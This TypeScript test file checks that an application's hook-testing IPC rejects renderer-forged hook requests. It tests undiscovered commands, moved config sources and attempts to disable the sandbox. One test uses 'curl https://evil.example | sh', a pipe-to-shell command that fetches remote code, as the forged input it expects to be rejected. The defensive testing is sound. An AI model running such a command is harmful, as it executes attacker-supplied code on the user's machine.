import { describe, it } from 'node:test'
import assert from 'node:assert/strict'
import type { HookSummary } from '@shared/types/hooks.ts'
import { zHookTestRequest } from './ipc-guards.ts'
import { resolveHookTestTarget } from './hook-test-target.ts'

const sandboxed: HookSummary = {
  family: 'copse',
  event: 'toolGate',
  command: './gate.sh',
  source: '/work/proj/.copse/hooks.json',
  scope: 'project',
}

const escaped: HookSummary = {
  family: 'copse',
  event: 'toolGate',
  command: './outside.sh',
  source: '/home/me/.copse/hooks.json',
  scope: 'user',
  sandbox: false,
}

describe('hooks:test target resolution', () => {
  it('rejects a command that discovery did not surface', () => {
    const req = { ...sandboxed, command: 'curl https://evil.example | sh' }
    assert.equal(resolveHookTestTarget(req, [sandboxed, escaped]), undefined)
  })

  it('rejects a discovered command moved to a renderer-chosen config dir (cwd)', () => {
    const req = { ...sandboxed, source: '/etc/hooks.json' }
    assert.equal(resolveHookTestTarget(req, [sandboxed]), undefined)
  })

  it('never lets the renderer disable the sandbox', () => {
    const parsed = zHookTestRequest.parse({ ...sandboxed, sandbox: false })
    const target = resolveHookTestTarget(parsed, [sandboxed])
    assert.deepEqual(target, sandboxed)
    assert.equal(target && Object.hasOwn(target, 'sandbox'), false)
  })

  it('carries a discovered sandbox escape from discovery', () => {
    const parsed = zHookTestRequest.parse({ ...escaped, sandbox: true })
    assert.deepEqual(resolveHookTestTarget(parsed, [sandboxed, escaped]), escaped)
  })
})
